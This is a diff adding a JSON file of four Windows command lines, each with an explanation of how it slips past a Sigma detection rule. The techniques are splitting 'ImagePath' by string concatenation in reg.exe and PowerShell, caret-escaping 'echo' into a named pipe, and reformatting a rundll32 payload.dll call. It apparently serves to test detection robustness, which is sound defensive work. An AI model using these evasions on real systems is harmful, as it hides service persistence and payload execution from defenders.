@@ -1,0 +1,18 @@
+[
+  {
+    "output": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ExampleService\" /v \"Image\" + \"Path\" /t REG_EXPAND_SZ /d \"C:\\path\\to\\file.exe\" /f",
+    "explanation": "The rule uses 'all of selection_*' logic and relies on exact string matches like 'ImagePath' in the command line. If an operator utilizes native string splitting or concatenation features supported by specific syntax interpreters, or targets completely alternative subkeys or parameters that map back to the same registration logic, the 'selection_data' match fails."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ExampleService' -Name 'Image'+'Path' -Value 'C:\\path\\to\\file.exe'\"",
+    "explanation": "The rule enforces a match on 'ImagePath' using a strict string filter. Breaking the keyword via string concatenation inside PowerShell (e.g., 'Image'+'Path') satisfies the runtime parser execution while ensuring the command line string recorded in the process creation log misses the static signature requirement."
+  },
+  {
+    "output": "%COMSPEC% /c e^cho 559891bb017 > \\\\.\\\\pipe\\\\5e120a",
+    "explanation": "The Sigma rule relies on exact static string matching for the word 'echo'. By utilizing the standard Windows command prompt escape character (^), the string is broken up in the command line logs (e.g., e^cho). The command still executes normally via cmd.exe, but the SIEM rule fails to trigger because the 'CommandLine|contains|all' condition for 'echo' is no longer met."
+  },
+  {
+    "output": "rundll32.exe C:\\Windows\\Temp\\payload.dll, a /p:tmexsn",
+    "explanation": "For technique 2, the rule specifically looks for the exact string sequence '.dll,a'. By simply adding a space after the comma ('.dll, a') or by modifying the exported function name from 'a' to another character during payload generation, the literal string match fails and the detection is bypassed."
+  }
+]
